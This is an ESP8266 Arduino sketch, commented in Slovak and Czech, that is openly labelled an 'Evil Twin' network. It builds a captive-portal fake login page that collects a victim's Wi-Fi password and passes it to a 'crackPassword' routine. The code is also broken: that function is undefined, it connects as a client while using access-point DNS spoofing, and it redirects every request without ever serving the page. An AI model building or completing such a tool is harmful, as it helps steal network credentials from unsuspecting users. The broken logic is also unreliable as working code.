#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <Arduboy2.h>

const char* ssid = "MojaWiFi";  // Názov Evil Twin siete
const int chipSelect = D8;  // Pin pripojený k CS (Chip Select) na SD kartovom module
Arduboy2 arduboy;

ESP8266WebServer server(80);
DNSServer dnsServer;

void setup() {
  Serial.begin(115200);

  // Pripojenie k WiFi sieti
  WiFi.begin(ssid);
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }
  Serial.println("Connected to WiFi");

  // Inicializácia SD karty
  if (!SD.begin(chipSelect)) {
    Serial.println("Card Mount Failed");
    return;
  }
  Serial.println("SD card mounted");

  // Přidání DNS serveru pro Captive Portal
  dnsServer.start(53, "*", WiFi.softAPIP());
  // Definícia routy pre webovú stránku
  server.on("/", HTTP_GET, handleRoot);

  arduboy.begin();
  arduboy.clear();
  arduboy.display();
}
void loop() {
  server.handleClient();
  // Obsluha DNS serveru pro Captive Portal
  dnsServer.processNextRequest();
}

void handleRoot() {
  String message;

  // Získanie hesla zo vstupu
  String password = server.arg("password");

  // Skúsiť prelomiť heslo
  if (crackPassword(password)) {
    message = "Correct password";
  } else {
    message = "Incorrect password, please try again.";
  }

  // Zobrazenie správy na webovej stránke
  String html = "<html>\
                  <head>\
                    <meta charset='UTF-8'>\
                    <meta name='viewport' content='width=device-width, initial-scale=1.0'>\
                    <title>Login Page</title>\
                    <style>\
                      body {\
                        display: flex;\
                        justify-content: center;\
                        align-items: center;\
                        height: 100vh;\
                        margin: 0;\
                        background-color: #f5f5f5;\
                      }\
                      #loginBox {\
                        padding: 20px;\
                        border-radius: 10px;\
                        background-color: #4CAF50;\
                        color: #fff;\
                        text-align: center;\
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\
                      }\
                      input {\
                        padding: 10px;\
                        font-size: 16px;\
                        margin-bottom: 10px;\
                        width: 100%;\
                        box-sizing: border-box;\
                      }\
                      #message {\
                        font-size: 18px;\
                        font-weight: bold;\
                      }\
                    </style>\
                  </head>\
                  <body>\
                    <div id='loginBox'>\
                      <h1>Log In</h1>\
                      <input type='password' id='passwordInput' placeholder='Enter your password'>\
                      <div id='message'>" + message + "</div>\
                    </div>\
                    <script>\
                      document.getElementById('passwordInput').addEventListener('keypress', function (e) {\
                        if (e.key === 'Enter') {\
                          var userInput = document.getElementById('passwordInput').value;\
                          if (userInput) {\
                            document.getElementById('message').innerText = 'Checking password...';\
                            var xhr = new XMLHttpRequest();\
                            xhr.open('POST', '/', true);\
                            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\
                            xhr.onreadystatechange = function () {\
                              if (xhr.readyState == 4 && xhr.status == 200) {\
                                document.getElementById('message').innerText = xhr.responseText;\
                              }\
                            };\
                            xhr.send('password=' + userInput);\
                          }\
                        }\
                      });\
                    </script>\
                  </body>\
                </html>";
  // Přesměrování pro Captive Portal
  String redirect = "http://";
  redirect += WiFi.softAPIP().toString();
  redirect += "/";
  server.sendHeader("Location", redirect, true);
  server.send(302, "text/plain", "");
}
